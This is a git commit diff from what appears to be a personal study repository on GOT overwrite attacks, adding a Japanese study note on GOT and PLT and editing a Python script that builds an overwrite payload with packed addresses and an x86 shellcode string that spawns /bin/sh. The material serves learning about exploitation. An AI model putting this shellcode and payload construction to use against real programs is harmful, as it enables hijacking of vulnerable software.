32ffeeb8e6be4d7693ba29314373cbf2cb95391e
飛田大二郎 <pelo.canvas@gmail.com>
2021-02-06 23:41:20 +0900

    update

---
+++ documents/got_overwrite.md
@@ -0,0 +1,10 @@
+#### GOT overwrite について
+
+1. 目的  
+GOT overwriteについて理解する  
+
+1. キーワード
+ - GOT (Global Offset Table)  
+ - PLT (Procedure Linkage Table)
+
+1. PLT と GOT  
--- tests/got_overwrite/test.py
+++ tests/got_overwrite/test.py
@@ -4,15 +4,15 @@ from subprocess import Popen
 
 # addr = 0xbffff6f8
 addr_got = 0x000000ff
-addr_buf = 0x0000ff00
+addr_buf = 0x3456ff88
 
 # shellcode = "\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80"
 shellcode = "\\x31\\xd2\\x52\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x52\\x53\\x89\\xe1\\x8d\\x42\\x0b\\xcd\\x80"
 
 
-print('%d' % int('0x000000ff', 16))
+# print('%d' % int('0x000000ff', 16))
 offset = 7
-print("addr_got:%d, addr_buf:%d, offset:%d" % (addr_got, addr_buf, offset))
+# print("addr_got:%d, addr_buf:%d, offset:%d" % (addr_got, addr_buf, offset))
 
 buf = ''
 for i in range(4):
@@ -22,13 +22,17 @@ for i in range(4):
         idx = 8-2*(j+1)
         buf += '\\x' + hex_str[idx] + hex_str[idx + 1]
 
-print(buf)
+# print(buf)
 buf += shellcode
-print(buf)
+# print(buf)
 
 slide_addr_buf = addr_buf + 16
 lit_addr_buf = struct.pack('<I', slide_addr_buf)
 print("lit_addr_buf:%s" % lit_addr_buf)
+print(lit_addr_buf[:2])
+print(lit_addr_buf[2:4])
+print(lit_addr_buf[4:6])
+print(lit_addr_buf[6:8])
 
 
 # a = list(map(ord, b))
